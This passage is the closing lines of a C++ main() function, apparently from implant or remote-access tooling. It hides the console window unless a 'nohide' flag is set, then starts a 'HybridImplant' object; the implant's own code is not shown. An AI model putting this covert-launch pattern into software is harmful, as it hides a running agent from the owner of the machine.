    if (!nohide) ShowWindow(GetConsoleWindow(), SW_HIDE);

    HybridImplant implant;
    implant.Start();
    return 0;
}
